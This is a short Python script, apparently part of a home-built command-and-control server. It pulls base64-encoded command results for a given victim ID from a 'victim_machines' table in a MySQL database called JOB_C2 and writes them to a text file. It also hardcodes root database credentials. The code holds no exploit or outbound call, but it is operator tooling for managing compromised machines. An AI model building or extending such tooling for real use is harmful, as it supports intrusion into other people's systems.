#!/usr/bin/env python
import io
import re
import base64
import sys
import json
import mysql.connector
from mysql.connector import MySQLConnection, Error

def decode ( input ):
	command_output = input
	output_bytes = command_output.encode('ascii')
	decoded_output_bytes = base64.b64decode(output_bytes)
	decoded_output = decoded_output_bytes.decode('ascii')
	return decoded_output

def getoutput( id ):

	#query to check whether or not the id requested appears in the database
	query = """ SELECT command_output, command_record FROM victim_machines WHERE victim_id =%s """
	data = (id,)

	#https://www.mysqltutorial.org/python-mysql-update/
	try:
		#connect to the mysql database
		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')
#		if connection.is_connected():
#			print('Connected to JOB_C2 database')

		cursor = connection.cursor(buffered=True)
		cursor.execute(query,data)
		result = cursor.fetchall()
#		print(result[0][1])

		if result:
			print("id found in the database, decoding output and cleaning database...")
			#get command output, decode it, output it, and set command_output to empty set
			decoded_output = decode(result[0][0])
			decoded_record = decode(result[0][1])

			record_data = json.loads(decoded_record)
			output_data = json.loads(decoded_output)

			newfilename = id + ".txt"
			file = open(newfilename, "a")

			print("command output written to file named %s.txt" % (id,))
			for key1, value1 in output_data.items():
				for key2, value2 in record_data.items():
					if key1 == key2:
						file.write("%s : %s\n" % (value2, value1))

			file.close()
#			print(json.dumps(json_data, indent=2))

#			cleanup_query = """ UPDATE victim_machines SET command_output = 'e30=' WHERE victim_id =%s ""
#			cursor.execute(cleanup_query,data)

		else:
			print("id not found in the database, try again")

		connection.commit()

	except Error as error:
		print(error)

	finally:
		cursor.close()
		connection.close()

	return True

if __name__ == "__main__":
	getoutput(*sys.argv[1:])
